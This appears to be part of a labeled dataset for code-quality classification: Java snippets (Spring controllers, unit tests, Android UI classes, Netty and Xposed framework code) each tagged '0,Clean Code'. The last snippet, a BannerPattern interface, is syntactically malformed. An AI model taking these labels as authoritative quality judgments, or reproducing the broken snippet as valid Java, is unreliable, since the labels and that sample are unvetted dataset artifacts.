    Assert.assertEquals(10,semaphore.getMaxPermits());
  }
}",0,Clean Code
"public interface TypeHintCreatingProcessor {
  /** 
 * Process a multiple  {@link Type types} by scanning the {@link TypeSystem} applying declared{@link TypeProcessor#filter(Predicate) filter} to identify inspection candidates.
 * @return the {@link List} of {@link HintDeclaration hints} to apply.
 */
  default List<HintDeclaration> processTypes(){
    return toProcessTypesMatching(filter -> true);
  }
  /** 
 * Process a multiple  {@link Type types}.
 * @param types must not be {@literal null}.
 * @return the {@link List} of {@link HintDeclaration hints} to apply.
 */
  default List<HintDeclaration> toProcessTypes(  Iterable<Type> types){
    return toProcessTypes(StreamSupport.stream(types.spliterator(),false));
  }
  /** 
 * Process a multiple  {@link Type types}.
 * @param types must not be {@literal null}.
 * @return the list of hint declaration
 */
  default List<HintDeclaration> toProcessTypes(  Stream<Type> types){
    return toProcessTypes(typeSystem -> types);
  }
  /** 
 * Process a multiple  {@link Type types} that match a given filter {@link Predicate}.
 * @param filter must not be {@literal null}.
 * @return the {@link List} of {@link HintDeclaration hints} to apply.
 */
  default List<HintDeclaration> toProcessTypesMatching(  Predicate<Type> filter){
    return toProcessTypes(typeSystem -> TypeProcessor.scanForTypes(typeSystem,filter));
  }
  /** 
 * Use a lookup  {@link Function} to provide a {@link java.util.stream.Stream} of {@link Type types}.
 * @param lookup must not be {@literal null}.
 * @return the {@link List} of {@link HintDeclaration hints} to apply.
 */
  List<HintDeclaration> toProcessTypes(  Function<TypeSystem,Stream<Type>> lookup);
  /** 
 * Process a single  {@link Type}.
 * @param type must not be {@literal null}.
 * @return the {@link List} of {@link HintDeclaration hints} to apply.
 */
  List<HintDeclaration> toProcessType(  Type type);
}
",0,Clean Code
"@Tag(name=""管理后台 - 邮件模版"") @RestController @RequestMapping(""/system/mail-template"") public class MailTemplateController {
  @Resource private MailTemplateService mailTempleService;
  @Resource private MailSendService mailSendService;
  @PostMapping(""/create"") @Operation(summary=""创建邮件模版"") @PreAuthorize(""@ss.hasPermission('system:mail-template:create')"") public CommonResult<Long> createMailTemplate(  @Valid @RequestBody MailTemplateSaveReqVO createReqVO){
    return success(mailTempleService.createMailTemplate(createReqVO));
  }
  @PutMapping(""/update"") @Operation(summary=""修改邮件模版"") @PreAuthorize(""@ss.hasPermission('system:mail-template:update')"") public CommonResult<Boolean> updateMailTemplate(  @Valid @RequestBody MailTemplateSaveReqVO updateReqVO){
    mailTempleService.updateMailTemplate(updateReqVO);
    return success(true);
  }
  @DeleteMapping(""/delete"") @Operation(summary=""删除邮件模版"") @Parameter(name=""id"",description=""编号"",required=true,example=""1024"") @PreAuthorize(""@ss.hasPermission('system:mail-template:delete')"") public CommonResult<Boolean> deleteMailTemplate(  @RequestParam(""id"") Long id){
    mailTempleService.deleteMailTemplate(id);
    return success(true);
  }
  @GetMapping(""/get"") @Operation(summary=""获得邮件模版"") @Parameter(name=""id"",description=""编号"",required=true,example=""1024"") @PreAuthorize(""@ss.hasPermission('system:mail-template:query')"") public CommonResult<MailTemplateRespVO> getMailTemplate(  @RequestParam(""id"") Long id){
    MailTemplateDO template=mailTempleService.getMailTemplate(id);
    return success(BeanUtils.toBean(template,MailTemplateRespVO.class));
  }
  @GetMapping(""/page"") @Operation(summary=""获得邮件模版分页"") @PreAuthorize(""@ss.hasPermission('system:mail-template:query')"") public CommonResult<PageResult<MailTemplateRespVO>> getMailTemplatePage(  @Valid MailTemplatePageReqVO pageReqVO){
    PageResult<MailTemplateDO> pageResult=mailTempleService.getMailTemplatePage(pageReqVO);
    return success(BeanUtils.toBean(pageResult,MailTemplateRespVO.class));
  }
  @GetMapping({""/list-all-simple"",""simple-list""}) @Operation(summary=""获得邮件模版精简列表"") public CommonResult<List<MailTemplateSimpleRespVO>> getSimpleTemplateList(){
    List<MailTemplateDO> list=mailTempleService.getMailTemplateList();
    return success(BeanUtils.toBean(list,MailTemplateSimpleRespVO.class));
  }
  @PostMapping(""/send-mail"") @Operation(summary=""发送短信"") @PreAuthorize(""@ss.hasPermission('system:mail-template:send-mail')"") public CommonResult<Long> sendMail(  @Valid @RequestBody MailTemplateSendReqVO sendReqVO){
    return success(mailSendService.sendSingleMailToAdmin(sendReqVO.getMail(),getLoginUserId(),sendReqVO.getTemplateCode(),sendReqVO.getTemplateParams()));
  }
}
",0,Clean Code
"@Slf4j public class ConsistentHashTest {
  Long startTime;
  List<String> servers;
  ConsistentHash<String> hash;
  Integer jobNum=300000;
  List<Integer> jobIds=new ArrayList<>();
  @BeforeEach public void init(){
    startTime=System.currentTimeMillis();
    servers=new ArrayList<>(Arrays.asList(""Server-A"",""Server-B"",""Server-C""));
    hash=new ConsistentHash<>(servers);
    for (int i=0; i < jobNum; i++) {
      jobIds.add(i);
    }
  }
  @Test public void initWatch(){
    Map<String,Long> counts=jobIds.stream().map(hash::get).collect(Collectors.groupingBy(Function.identity(),Collectors.counting()));
    counts.forEach((k,v) -> {
      log.info(""node:{}, initWatch count:{}"",k,v);
    }
);
    log.info(""time: {}ms"",System.currentTimeMillis() - startTime);
  }
  @Test public void addServer(){
    servers.add(""Server-D"");
    hash.add(""Server-D"");
    Map<String,Long> counts=jobIds.stream().map(hash::get).collect(Collectors.groupingBy(Function.identity(),Collectors.counting()));
    counts.forEach((k,v) -> {
      log.info(""node:{}, addServer count:{}"",k,v);
    }
);
    log.info(""time: {}ms"",System.currentTimeMillis() - startTime);
  }
  @Test public void removeServer(){
    servers.remove(""Server-C"");
    hash.remove(""Server-C"");
    Map<String,Long> counts=jobIds.stream().map(hash::get).collect(Collectors.groupingBy(Function.identity(),Collectors.counting()));
    counts.forEach((k,v) -> {
      log.info(""node:{}, removeServer count:{}"",k,v);
    }
);
    log.info(""time: {}ms"",System.currentTimeMillis() - startTime);
  }
}
",0,Clean Code
"/** 
 * Service factory to create raft services, such as Node/CliService etc.
 * @author boyan (boyan@alibaba-inc.com)2018-May-03 11:06:02 AM
 */
public final class RaftServiceFactory {
  /** 
 * Create a raft node with group id and it's serverId.
 */
  public static Node createRaftNode(  final String groupId,  final PeerId serverId){
    return new NodeImpl(groupId,serverId);
  }
  /** 
 * Create and initialize a raft node with node options. Throw  {@link IllegalStateException} when fail to initialize.
 */
  public static Node createAndInitRaftNode(  final String groupId,  final PeerId serverId,  final NodeOptions opts){
    final Node ret=createRaftNode(groupId,serverId);
    if (!ret.init(opts)) {
      throw new IllegalStateException(""Fail to init node, please see the logs to find the reason."");
    }
    return ret;
  }
  /** 
 * Create a  {@link CliService} instance.
 */
  public static CliService createCliService(){
    return new CliServiceImpl();
  }
  /** 
 * Create and initialize a CliService instance.
 */
  public static CliService createAndInitCliService(  final CliOptions cliOptions){
    final CliService ret=createCliService();
    if (!ret.init(cliOptions)) {
      throw new IllegalStateException(""Fail to init CliService"");
    }
    return ret;
  }
}",0,Clean Code
"/** 
 * This module is designed to manage configuration parameter templates 
 */
@RestController @RequestMapping(path=""/basedata-manager/configuration-template"") public class ConfigurationTemplateRestfulApi {
  @Autowired ConfigurationTemplateService configurationTemplateService;
  @ApiOperation(value=""save"",notes=""save a configuration template"",httpMethod=""POST"") @RequestMapping(path=""/save"",method=RequestMethod.POST) public Message add(  HttpServletRequest httpRequest,  @RequestBody ConfigurationTemplateSaveRequest request){
    String username=ModuleUserUtils.getOperationUser(httpRequest,""save a configuration template"");
    if (!Configuration.isAdmin(username)) {
      return Message.error(""User '"" + username + ""' is not admin user[非管理员用户]"");
    }
    if (Objects.isNull(request) || StringUtils.isEmpty(request.getEngineLabelId()) || StringUtils.isEmpty(request.getKey())|| StringUtils.isEmpty(request.getName())|| StringUtils.isEmpty(request.getTreeName())) {
      throw new InvalidParameterException(""please check your parameter."");
    }
    Boolean flag=configurationTemplateService.saveConfigurationTemplate(request);
    return Message.ok("""").data(""success: "",flag);
  }
  @ApiImplicitParams({@ApiImplicitParam(paramType=""path"",dataType=""long"",name=""keyId"",value="""")}) @ApiOperation(value=""delete"",notes=""delete a configuration template"",httpMethod=""DELETE"") @RequestMapping(path=""/{keyId}"",method=RequestMethod.DELETE) public Message delete(  HttpServletRequest httpRequest,  @PathVariable(""keyId"") Long keyId){
    String username=ModuleUserUtils.getOperationUser(httpRequest,""delete a configuration template, keyId: "" + keyId);
    if (!Configuration.isAdmin(username)) {
      return Message.error(""User '"" + username + ""' is not admin user[非管理员用户]"");
    }
    Boolean flag=configurationTemplateService.deleteConfigurationTemplate(keyId);
    return Message.ok("""").data(""success: "",flag);
  }
  @ApiOperation(value=""engin-list"",notes=""get all engine list"",httpMethod=""GET"") @RequestMapping(path=""/engin-list"",method=RequestMethod.GET) public Message getEngineList(  HttpServletRequest httpRequest){
    ModuleUserUtils.getOperationUser(httpRequest,""get all engine list"");
    List<EngineLabelResponse> engineList=configurationTemplateService.getEngineList();
    return Message.ok("""").data(""success: "",engineList);
  }
  @ApiOperation(value=""template-list-by-label"",notes=""get template list by label"",httpMethod=""GET"") @RequestMapping(path=""/template-list-by-label"",method=RequestMethod.GET) public Message getTemplateListByLabelId(  HttpServletRequest httpRequest,  @RequestParam String engineLabelId){
    ModuleUserUtils.getOperationUser(httpRequest,""get template list by label, engineLabelId: "" + engineLabelId);
    if (StringUtils.isEmpty(engineLabelId)) {
      throw new InvalidParameterException(""please check your parameter."");
    }
    List<ConfigurationConfigKey> configKeyList=configurationTemplateService.getTemplateListByLabelId(engineLabelId);
    return Message.ok("""").data(""success: "",configKeyList);
  }
}
",0,Clean Code
"public class BlacklistListFragment extends Fragment implements BlacklistListAdapter.OnBlacklistItemClickListener, PopupMenu.OnMenuItemClickListener {
  RecyclerView recyclerView;
  private BlacklistViewModel blacklistViewModel;
  private BlacklistListAdapter blacklistListAdapter;
  private String selectedUserId;
  @Nullable @Override public View onCreateView(  @NonNull LayoutInflater inflater,  @Nullable ViewGroup container,  @Nullable Bundle savedInstanceState){
    View view=inflater.inflate(R.layout.blacklist_list_frament,container,false);
    bindViews(view);
    init();
    return view;
  }
  private void bindViews(  View view){
    recyclerView=view.findViewById(R.id.recyclerView);
  }
  @Override public void onResume(){
    super.onResume();
    refreshBlacklist();
  }
  private void init(){
    blacklistViewModel=ViewModelProviders.of(getActivity()).get(BlacklistViewModel.class);
    blacklistListAdapter=new BlacklistListAdapter();
    blacklistListAdapter.setOnBlacklistItemClickListener(this);
    recyclerView.setAdapter(blacklistListAdapter);
    recyclerView.setLayoutManager(new LinearLayoutManager(getActivity()));
  }
  private void refreshBlacklist(){
    List<String> blacklists=blacklistViewModel.getBlacklists();
    blacklistListAdapter.setBlackedUserIds(blacklists);
    blacklistListAdapter.notifyDataSetChanged();
  }
  @Override public void onItemClick(  String userId,  View v){
    PopupMenu popup=new PopupMenu(getActivity(),v);
    MenuInflater inflater=popup.getMenuInflater();
    inflater.inflate(R.menu.blacklist_popup,popup.getMenu());
    popup.setOnMenuItemClickListener(this);
    popup.show();
    selectedUserId=userId;
  }
  @Override public void onCreateOptionsMenu(  Menu menu,  MenuInflater inflater){
    super.onCreateOptionsMenu(menu,inflater);
  }
  @Override public boolean onMenuItemClick(  MenuItem item){
    if (item.getItemId() == R.id.remove) {
      ChatManager.Instance().setBlackList(selectedUserId,false,new GeneralCallback(){
        @Override public void onSuccess(){
          blacklistListAdapter.getBlackedUserIds().remove(selectedUserId);
          blacklistListAdapter.notifyDataSetChanged();
        }
        @Override public void onFail(        int errorCode){
          Toast.makeText(getActivity(),""删除失败"",Toast.LENGTH_SHORT).show();
        }
      }
);
      return true;
    }
    return false;
  }
}
",0,Clean Code
"@SuppressWarnings({""serial"",""this-escape""}) public class IonModule extends SimpleModule {
  @Serial private static final long serialVersionUID=1L;
  private static final Version VERSION=VersionUtil.parseVersion(""0.0.1"",""io.kestra"",""core"");
  public IonModule(){
    super(VERSION);
    addSerializer(LocalDate.class,new LocalDateSerializer());
    addSerializer(Instant.class,new InstantSerializer());
    addSerializer(OffsetDateTime.class,new StringTypedSerializer<>(OffsetDateTime.class,o -> o.format(DateTimeFormatter.ISO_OFFSET_DATE_TIME)));
    addSerializer(ZonedDateTime.class,new StringTypedSerializer<>(ZonedDateTime.class,o -> o.format(DateTimeFormatter.ISO_ZONED_DATE_TIME)));
    addSerializer(LocalDateTime.class,new StringTypedSerializer<>(LocalDateTime.class,o -> o.format(DateTimeFormatter.ISO_LOCAL_DATE_TIME)));
    addSerializer(OffsetTime.class,new StringTypedSerializer<>(OffsetTime.class,o -> o.format(DateTimeFormatter.ISO_OFFSET_TIME)));
    addSerializer(LocalTime.class,new StringTypedSerializer<>(LocalTime.class,o -> o.format(DateTimeFormatter.ISO_LOCAL_TIME)));
  }
  @Override public String getModuleName(){
    return getClass().getName();
  }
  @Override public Version version(){
    return PackageVersion.VERSION;
  }
  @Override public void setupModule(  SetupContext context){
    super.setupModule(context);
  }
public static class StringTypedSerializer<T> extends StdScalarSerializer<T> {
    @Serial private static final long serialVersionUID=1L;
    private final Function<T,String> mapper;
    protected StringTypedSerializer(    Class<T> cls,    Function<T,String> mapper){
      super(cls);
      this.mapper=mapper;
    }
    @Override public void serialize(    T value,    JsonGenerator jsonGenerator,    SerializerProvider serializerProvider) throws IOException {
      ((IonGenerator)jsonGenerator).writeString(value,mapper.apply(value));
    }
  }
public static class InstantSerializer extends StdScalarSerializer<Instant> {
    @Serial private static final long serialVersionUID=1L;
    protected InstantSerializer(){
      super(Instant.class);
    }
    @Override public void serialize(    Instant date,    JsonGenerator jsonGenerator,    SerializerProvider serializerProvider) throws IOException {
      ((IonGenerator)jsonGenerator).writeDate(date);
    }
  }
public static class LocalDateSerializer extends StdScalarSerializer<LocalDate> {
    @Serial private static final long serialVersionUID=1L;
    protected LocalDateSerializer(){
      super(LocalDate.class);
    }
    @Override public void serialize(    LocalDate date,    JsonGenerator jsonGenerator,    SerializerProvider serializerProvider) throws IOException {
      ((IonGenerator)jsonGenerator).writeDate(date);
    }
  }
}
",0,Clean Code
"public abstract class BaseRouter implements Router {
  protected volatile AtomicBoolean bootstrapHooked=new AtomicBoolean(false);
  public void initResourcesHook(){
    XposedBridge.initXResources();
  }
  public void prepare(  boolean isSystem){
    XposedInit.startsSystemServer=isSystem;
  }
  public void installBootstrapHooks(  boolean isSystem){
    try {
      if (!bootstrapHooked.compareAndSet(false,true)) {
        return;
      }
      startBootstrapHook(isSystem);
      XposedInit.initForZygote(isSystem);
    }
 catch (    Throwable t) {
      Utils.logE(""error during Xposed initialization"",t);
      XposedBridge.disableHooks=true;
    }
  }
  public void loadModulesSafely(  boolean callInitZygote){
    try {
      XposedInit.loadModules(callInitZygote);
    }
 catch (    Exception exception) {
      Utils.logE(""error loading module list"",exception);
    }
  }
  public String parsePackageName(  String appDataDir){
    if (TextUtils.isEmpty(appDataDir)) {
      return """";
    }
    int lastIndex=appDataDir.lastIndexOf(""/"");
    if (lastIndex < 1) {
      return """";
    }
    return appDataDir.substring(lastIndex + 1);
  }
  @ApiSensitive(Level.LOW) public void startBootstrapHook(  boolean isSystem){
    Utils.logD(""startBootstrapHook starts: isSystem = "" + isSystem);
    ClassLoader classLoader=BaseRouter.class.getClassLoader();
    if (isSystem) {
      XposedHelpers.findAndHookMethod(SystemMainHooker.className,classLoader,SystemMainHooker.methodName,new SystemMain());
    }
    XposedHelpers.findAndHookMethod(HandleBindAppHooker.className,classLoader,HandleBindAppHooker.methodName,""android.app.ActivityThread$AppBindData"",new HandleBindApp());
    XposedHelpers.findAndHookConstructor(LoadedApkConstructorHooker.className,classLoader,ActivityThread.class,ApplicationInfo.class,CompatibilityInfo.class,ClassLoader.class,boolean.class,boolean.class,boolean.class,new LoadedApkCstr());
  }
  public void startSystemServerHook(){
    StartBootstrapServices sbsHooker=new StartBootstrapServices();
    Object[] paramTypesAndCallback=Versions.hasR() ? new Object[]{""com.android.server.utils.TimingsTraceAndSlog"",sbsHooker} : new Object[]{sbsHooker};
    XposedHelpers.findAndHookMethod(StartBootstrapServicesHooker.className,SystemMain.systemServerCL,StartBootstrapServicesHooker.methodName,paramTypesAndCallback);
  }
}
",0,Clean Code
"/** 
 * decoder
 * @author xuxueli 2015-10-29 19:02:36
 */
public class NettyDecoder extends ByteToMessageDecoder {
  private Class<?> genericClass;
  private Serializer serializer;
  public NettyDecoder(  Class<?> genericClass,  final Serializer serializer){
    this.genericClass=genericClass;
    this.serializer=serializer;
  }
  @Override public final void decode(  ChannelHandlerContext ctx,  ByteBuf in,  List<Object> out) throws Exception {
    if (in.readableBytes() < 4) {
      return;
    }
    in.markReaderIndex();
    int dataLength=in.readInt();
    if (dataLength < 0) {
      ctx.close();
    }
    if (in.readableBytes() < dataLength) {
      in.resetReaderIndex();
      return;
    }
    byte[] data=new byte[dataLength];
    in.readBytes(data);
    Object obj=serializer.deserialize(data,genericClass);
    out.add(obj);
  }
}
",0,Clean Code
"public class InputAwareLayout extends KeyboardAwareLinearLayout implements KeyboardAwareLinearLayout.OnKeyboardShownListener {
  private InputView current;
  public InputAwareLayout(  Context context){
    this(context,null);
  }
  public InputAwareLayout(  Context context,  AttributeSet attrs){
    this(context,attrs,0);
  }
  public InputAwareLayout(  Context context,  AttributeSet attrs,  int defStyle){
    super(context,attrs,defStyle);
    addOnKeyboardShownListener(this);
  }
  @Override public void onKeyboardShown(){
    hideAttachedInput(true);
  }
  public void show(  @NonNull final EditText imeTarget,  @NonNull final InputView input){
    if (isKeyboardOpen()) {
      hideSoftkey(imeTarget,new Runnable(){
        @Override public void run(){
          hideAttachedInput(true);
          input.show(getKeyboardHeight(),true);
          current=input;
        }
      }
);
    }
 else {
      if (current != null)       current.hide(true);
      input.show(getKeyboardHeight(),current != null);
      current=input;
    }
  }
  public InputView getCurrentInput(){
    return current;
  }
  public void hideCurrentInput(  EditText imeTarget){
    if (isKeyboardOpen())     hideSoftkey(imeTarget,null);
 else     hideAttachedInput(false);
  }
  public void hideAttachedInput(  boolean instant){
    if (current != null)     current.hide(instant);
    current=null;
  }
  public boolean isInputOpen(){
    return (isKeyboardOpen() || (current != null && current.isShowing()));
  }
  public void showSoftkey(  final EditText inputTarget){
    postOnKeyboardOpen(new Runnable(){
      @Override public void run(){
        hideAttachedInput(true);
      }
    }
);
    inputTarget.post(new Runnable(){
      @Override public void run(){
        inputTarget.requestFocus();
        ServiceUtil.getInputMethodManager(inputTarget.getContext()).showSoftInput(inputTarget,0);
      }
    }
);
  }
  public void hideSoftkey(  final EditText inputTarget,  @Nullable Runnable runAfterClose){
    if (runAfterClose != null)     postOnKeyboardClose(runAfterClose);
    ServiceUtil.getInputMethodManager(inputTarget.getContext()).hideSoftInputFromWindow(inputTarget.getWindowToken(),0);
  }
public interface InputView {
    void show(    int height,    boolean immediate);
    void hide(    boolean immediate);
    boolean isShowing();
  }
}
",0,Clean Code
"/** 
 * Utility to dump the contents of class files in a human-friendly form. 
 */
public final class ClassDumper extends BaseDumper {
  /** 
 * Constructs an instance. This class is not publicly instantiable. Use  {@link #dump}. 
 */
  private ClassDumper(  byte[] bytes,  PrintStream out,  String filePath,  Args args){
    super(bytes,out,filePath,args);
  }
  /** 
 * Dumps the given array, interpreting it as a class file.
 * @param bytes {@code non-null;} bytes of the (alleged) class file
 * @param out {@code non-null;} where to dump to passed in as &lt;= 0
 * @param filePath the file path for the class, excluding any base directory specification
 * @param args bag of commandline arguments
 */
  public static void dump(  byte[] bytes,  PrintStream out,  String filePath,  Args args){
    ClassDumper cd=new ClassDumper(bytes,out,filePath,args);
    cd.dump();
  }
  /** 
 * Does the dumping. 
 */
  public void dump(){
    byte[] bytes=getBytes();
    ByteArray ba=new ByteArray(bytes);
    DirectClassFile cf=new DirectClassFile(ba,getFilePath(),getStrictParse());
    cf.setAttributeFactory(StdAttributeFactory.THE_ONE);
    cf.setObserver(this);
    cf.getMagic();
    int readBytes=getReadBytes();
    if (readBytes != bytes.length) {
      parsed(ba,readBytes,bytes.length - readBytes,""<extra data at end of file>"");
    }
  }
}
",0,Clean Code
"/** 
 * @author hzh
 */
public class ParallelZipStrategyTest {
  private File sourceDir;
  private ZipStrategy zipStrategy;
  @Before public void startup() throws IOException {
    this.sourceDir=new File(""zip_test"");
    this.zipStrategy=new ParallelZipStrategy(9,6);
    if (this.sourceDir.exists()) {
      FileUtils.forceDelete(this.sourceDir);
    }
    FileUtils.forceMkdir(this.sourceDir);
    final File f1=Paths.get(this.sourceDir.getAbsolutePath(),""f1"").toFile();
    FileUtils.write(f1,""f1"");
    final File d1=Paths.get(this.sourceDir.getAbsolutePath(),""d1"").toFile();
    FileUtils.forceMkdir(d1);
    final File f11=Paths.get(d1.getAbsolutePath(),""f11"").toFile();
    FileUtils.write(f11,""f11"");
    final File d2=Paths.get(d1.getAbsolutePath(),""d2"").toFile();
    FileUtils.forceMkdir(d2);
    final File d3=Paths.get(d2.getAbsolutePath(),""d3"").toFile();
    FileUtils.forceMkdir(d3);
    final File f31=Paths.get(d3.getAbsolutePath(),""f31"").toFile();
    FileUtils.write(f31,""f32"");
  }
  @After public void teardown() throws IOException {
    FileUtils.forceDelete(this.sourceDir);
  }
  @Test public void zipTest() throws Throwable {
    final String rootPath=this.sourceDir.toPath().toAbsolutePath().getParent().toString();
    final Path outPath=Paths.get(rootPath,""kv.zip"");
    final Checksum c1=new CRC64();
    zipStrategy.compress(rootPath,""zip_test"",outPath.toString(),c1);
    System.out.println(Long.toHexString(c1.getValue()));
    final Checksum c2=new CRC64();
    zipStrategy.deCompress(Paths.get(rootPath,""kv.zip"").toString(),rootPath,c2);
    Assert.assertEquals(c1.getValue(),c2.getValue());
    FileUtils.forceDelete(outPath.toFile());
  }
}",0,Clean Code
"public static final class SonBuilder {
  private String name;
  private String sonName;
  private int fatherAge;
  private int sonAge;
  private SonBuilder(){
  }
  public SonBuilder name(  String name){
    this.name=name;
    return this;
  }
  public SonBuilder sonName(  String sonName){
    this.sonName=sonName;
    return this;
  }
  public SonBuilder fatherAge(  int fatherAge){
    this.fatherAge=fatherAge;
    return this;
  }
  public SonBuilder sonAge(  int sonAge){
    this.sonAge=sonAge;
    return this;
  }
  public Son build(){
    Son son=new Son();
    son.setFatherName(name);
    son.setSonName(sonName);
    son.setFatherAge(fatherAge);
    son.setSonAge(sonAge);
    return son;
  }
}
",0,Clean Code
"/** 
 * 签到记录 Convert
 * @author 芋道源码
 */
@Mapper public interface MemberSignInRecordConvert {
  MemberSignInRecordConvert INSTANCE=Mappers.getMapper(MemberSignInRecordConvert.class);
  default PageResult<MemberSignInRecordRespVO> convertPage(  PageResult<MemberSignInRecordDO> pageResult,  List<MemberUserDO> users){
    PageResult<MemberSignInRecordRespVO> voPageResult=convertPage(pageResult);
    Map<Long,MemberUserDO> userMap=convertMap(users,MemberUserDO::getId);
    voPageResult.getList().forEach(record -> MapUtils.findAndThen(userMap,record.getUserId(),memberUserRespDTO -> record.setNickname(memberUserRespDTO.getNickname())));
    return voPageResult;
  }
  PageResult<MemberSignInRecordRespVO> convertPage(  PageResult<MemberSignInRecordDO> pageResult);
  PageResult<AppMemberSignInRecordRespVO> convertPage02(  PageResult<MemberSignInRecordDO> pageResult);
  AppMemberSignInRecordRespVO coverRecordToAppRecordVo(  MemberSignInRecordDO memberSignInRecordDO);
  default MemberSignInRecordDO convert(  Long userId,  MemberSignInRecordDO lastRecord,  List<MemberSignInConfigDO> configs){
    configs.sort(Comparator.comparing(MemberSignInConfigDO::getDay));
    MemberSignInConfigDO lastConfig=CollUtil.getLast(configs);
    int day=1;
    if (lastRecord != null && DateUtils.isYesterday(lastRecord.getCreateTime())) {
      day=lastRecord.getDay() + 1;
    }
    if (day > lastConfig.getDay()) {
      day=1;
    }
    MemberSignInRecordDO record=new MemberSignInRecordDO().setUserId(userId).setDay(day).setPoint(0).setExperience(0);
    MemberSignInConfigDO config=CollUtil.findOne(configs,item -> ObjUtil.equal(item.getDay(),record.getDay()));
    if (config == null) {
      return record;
    }
    record.setPoint(config.getPoint());
    record.setExperience(config.getExperience());
    return record;
  }
}
",0,Clean Code
"/** 
 * <p> 服务实现类 </p>
 * @author lengleng
 * @since 2018-05-15
 */
@Service @RequiredArgsConstructor public class SysOauthClientDetailsServiceImpl extends ServiceImpl<SysOauthClientDetailsMapper,SysOauthClientDetails> implements SysOauthClientDetailsService {
  /** 
 * 根据客户端信息
 * @param clientDetails
 * @return
 */
  @Override @CacheEvict(value=CacheConstants.CLIENT_DETAILS_KEY,key=""#clientDetails.clientId"") @Transactional(rollbackFor=Exception.class) public Boolean updateClientById(  SysOauthClientDetails clientDetails){
    this.insertOrUpdate(clientDetails);
    return Boolean.TRUE;
  }
  /** 
 * 添加客户端
 * @param clientDetails
 * @return
 */
  @Override @Transactional(rollbackFor=Exception.class) public Boolean saveClient(  SysOauthClientDetails clientDetails){
    this.insertOrUpdate(clientDetails);
    return Boolean.TRUE;
  }
  /** 
 * 插入或更新客户端对象
 * @param clientDetails
 * @return
 */
  private SysOauthClientDetails insertOrUpdate(  SysOauthClientDetails clientDetails){
    saveOrUpdate(clientDetails);
    return clientDetails;
  }
  /** 
 * 分页查询客户端信息
 * @param page
 * @param query
 * @return
 */
  @Override public Page queryPage(  Page page,  SysOauthClientDetails query){
    return baseMapper.selectPage(page,Wrappers.query(query));
  }
  @Override @CacheEvict(value=CacheConstants.CLIENT_DETAILS_KEY,allEntries=true) public R syncClientCache(){
    return R.ok();
  }
}
",0,Clean Code
"/** 
 * 文件工具类
 * @author 芋道源码
 */
public class FileUtils {
  /** 
 * 创建临时文件 该文件会在 JVM 退出时，进行删除
 * @param data 文件内容
 * @return 文件
 */
  @SneakyThrows public static File createTempFile(  String data){
    File file=createTempFile();
    FileUtil.writeUtf8String(data,file);
    return file;
  }
  /** 
 * 创建临时文件 该文件会在 JVM 退出时，进行删除
 * @param data 文件内容
 * @return 文件
 */
  @SneakyThrows public static File createTempFile(  byte[] data){
    File file=createTempFile();
    FileUtil.writeBytes(data,file);
    return file;
  }
  /** 
 * 创建临时文件，无内容 该文件会在 JVM 退出时，进行删除
 * @return 文件
 */
  @SneakyThrows public static File createTempFile(){
    File file=File.createTempFile(IdUtil.simpleUUID(),null);
    file.deleteOnExit();
    return file;
  }
  /** 
 * 生成文件路径
 * @param content      文件内容
 * @param originalName 原始文件名
 * @return path，唯一不可重复
 */
  public static String generatePath(  byte[] content,  String originalName){
    String sha256Hex=DigestUtil.sha256Hex(content);
    if (StrUtil.isNotBlank(originalName)) {
      String extName=FileNameUtil.extName(originalName);
      return StrUtil.isBlank(extName) ? sha256Hex : sha256Hex + ""."" + extName;
    }
    return sha256Hex + '.' + FileTypeUtil.getType(new ByteArrayInputStream(content));
  }
}
",0,Clean Code
"@RuntimePermissions public class SettingsDashboardActivity extends ThemeActivity {
  private ExportLogUi exportLogUi;
  public static void start(  Context context){
    ActivityUtils.startActivity(context,SettingsDashboardActivity.class);
  }
  @Override protected void onCreate(  @Nullable Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_settings_dashboard);
    setSupportActionBar(findViewById(R.id.toolbar));
    Objects.requireNonNull(getSupportActionBar()).setDisplayHomeAsUpEnabled(true);
    exportLogUi=new ExportLogUi(thisActivity());
    if (savedInstanceState == null) {
      getSupportFragmentManager().beginTransaction().replace(R.id.container,new SettingsDashboardFragment()).commit();
    }
    findViewById(R.id.fab).setOnClickListener(v -> showFeedbackDialog());
    findViewById(R.id.guide).setOnClickListener(v -> BrowserUtils.launch(thisActivity(),BuildProp.THANOX_URL_DOCS_HOME));
    findViewById(R.id.guide).setOnLongClickListener(v -> {
      OnBoardingActivity.Starter.INSTANCE.start(thisActivity());
      return true;
    }
);
    findViewById(R.id.recovery_utils).setOnClickListener(v -> {
      RecoveryUtilsActivity.Companion.start(thisActivity());
    }
);
  }
  @Override public boolean onOptionsItemSelected(  @NonNull MenuItem item){
    if (android.R.id.home == item.getItemId()) {
      finish();
      return true;
    }
    return super.onOptionsItemSelected(item);
  }
  private void showFeedbackDialog(){
    exportLogUi.show(() -> {
      if (OsUtils.isTOrAbove()) {
        SettingsDashboardActivityPermissionRequester.exportLogRequestedTOrAboveChecked(SettingsDashboardActivity.this);
      }
 else {
        SettingsDashboardActivityPermissionRequester.exportLogRequestedTBelowChecked(SettingsDashboardActivity.this);
      }
    }
);
  }
  @RequiresPermission({Manifest.permission.READ_MEDIA_IMAGES,Manifest.permission.READ_MEDIA_AUDIO,Manifest.permission.READ_MEDIA_VIDEO}) void exportLogRequestedTOrAbove(){
  }
  @RequiresPermission({Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.WRITE_EXTERNAL_STORAGE}) void exportLogRequestedTBelow(){
  }
}
",0,Clean Code
"interface BannerPattern extends ProtocolObject, BannerPatterns {
  permits BannerPatternImpl;
{
    @NotNull NetworkBuffer.Type<DynamicRegistry.Key<BannerPattern>> NETWORK_TYPE=NetworkBuffer.RegistryKey(Registries::bannerPattern,true);
    @NotNull BinaryTagSerializer<DynamicRegistry.Key<BannerPattern>> NBT_TYPE=BinaryTagSerializer.registryKey(Registries::bannerPattern);
  }
  static @NotNull BannerPattern create(  @NotNull NamespaceID assetId,  @NotNull String translationKey){
    return new BannerPatternImpl(assetId,translationKey,null);
  }
  static @NotNull Builder builder(){
    return new Builder();
  }
  /** 
 * <p>Creates a new registry for banner patterns, loading the vanilla banner patterns.</p>
 * @see net.minestom.server.MinecraftServer to get an existing instance of the registry
 */
  @ApiStatus.Internal static @NotNull DynamicRegistry<BannerPattern> createDefaultRegistry(){
    return DynamicRegistry.create(""minecraft:banner_pattern"",BannerPatternImpl.REGISTRY_NBT_TYPE,Registry.Resource.BANNER_PATTERNS,(namespace,props) -> new BannerPatternImpl(Registry.bannerPattern(namespace,props)));
  }
  @NotNull NamespaceID assetId();
  @NotNull String translationKey();
  @Nullable Registry.BannerPatternEntry registry();
